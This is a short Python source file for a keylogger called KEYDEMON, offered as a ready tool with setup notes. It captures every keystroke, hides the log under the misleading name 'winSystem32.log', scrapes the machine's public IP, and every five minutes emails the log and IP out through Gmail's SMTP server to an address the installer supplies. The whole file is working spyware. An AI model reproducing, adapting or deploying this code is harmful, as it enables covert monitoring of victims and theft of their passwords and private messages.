'''
NAME:    KEYDEMON
AUTHOR:  S1DAL3X
VERSION: 1
PYTHON:  3.5.0

Please enter your gmail login and password before using (line 35 and 36)
You can change the time of sending log on e-mail (line 22)
'''

import logging
import socket
import smtplib
import threading ###
import threading
from bs4 import BeautifulSoup
from urllib.request import urlopen
from pynput.keyboard import Key, Listener


log = []
time_1 = 300.0      #every  minutes
log_dir = ""
logging.basicConfig(filename = (log_dir + "winSystem32.log"), level = logging.DEBUG, format = '%(asctime)s: %(message)s') #format = '%(asctime)s: %(message)s'


def timer(time):
    t = threading.Timer(time, get_outside_ip)
    t.start()


def report(ip_adress, log_text):
    report_text = str(ip_adress) + '\n' + 'LOG: \n\n' + '\n'.join(log_text)
    msgObject = smtplib.SMTP('smtp.gmail.com', 587)

    msgObject.starttls()
    msgObject.login('------', '------')
    msgObject.sendmail('123@gmail.com', '------', report_text.encode('utf8'))
    msgObject.quit()

    timer(time_1)

def get_outside_ip():
    url = urlopen('https://yandex.ru/internet/')
    soup = BeautifulSoup(url, 'html.parser')
    out_str = soup.find('div', class_='client__desc')
    out_str = str(out_str)
    ip = []

    for symbol in out_str:
        if '1234567890.'.find(symbol) != -1:
            ip.append(symbol)
    outside_ip = ''.join(ip)

    with open('winSystem32.log', 'r') as f:
        for line in f:
            log.append(line + '\n')
    report(outside_ip, log)



def on_press(key):
    logging.info(str(key))

timer(time_1)
with Listener(on_press = on_press) as listener:
    listener.join()
